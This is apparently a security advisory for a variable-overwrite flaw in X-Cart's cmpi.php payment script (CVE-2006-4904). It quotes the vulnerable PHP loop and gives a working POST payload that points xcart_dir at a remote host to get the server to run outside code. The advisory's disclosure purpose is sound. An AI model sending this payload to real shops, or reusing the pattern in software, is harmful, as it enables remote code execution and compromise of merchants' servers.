@@ -1,0 +1,37 @@
+X-Cart Arbitrary Variable Overwrite
+
+Vendor: Qualiteam
+Product: X-Cart
+Version: <= 4.1.3
+Website: http://www.x-cart.com/
+
+BID: 20108 
+CVE: CVE-2006-4904 
+OSVDB: 28957 
+SECUNIA: 22005 
+
+Description:
+X-Cart is a commercial web based eCommerce solution written in PHP and MySQL that allows for webmasters to host an online marketplace. Unfortunately an attacker may be able to execute arbitrary php code on an X-Cart installation by overwriting key configuration variables. However, because the vulnerability allows for any variables to be overwritten other attacks such as SQL Injection are probably possible as well. Qualiteam have released an updated version of their X-Cart software, and users are strongly encouraged to upgrade as soon as possible or delete the cmpi.php script that resides within the payments directory. 
+
+
+Arbitrary Variable Overwriting
+X-Cart comes with a number of payment processing scripts. Unfortunately the Cardinal payment processing script (cmpi.php) is vulnerable to arbitrary variable overwriting that allows for an attacker to conduct various attacks including arbitrary php code execution. Let's have a look at the vulnerable code in question. 
+if ($HTTP_POST_VARS) {
+	foreach ($HTTP_POST_VARS as $var => $value) {
+		$$var = $value;
+	}
+}
+
+As we can see every single post variable is dynamically evaluated. This is especially dangerous because register globals and magic quotes gpc settings do not affect an attackers ability to overwrite key configuration variables. 
+
+stand_alone=0&httpsmod_active=1&orderids=1&close_frame=1&xcart_dir=http://shell 
+
+By sending a post request with the above variables set will automatically include an execute a remote arbitrary file on the vulnerable X-Cart installation, which in turn leads to remote php code execution on the underlying web server in most cases. 
+
+
+Solution:
+The X-Cart team were very quick and professional in their response to this issue.An updated version of X-Cart has been released and users are encouraged to upgrade as soon as possible. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
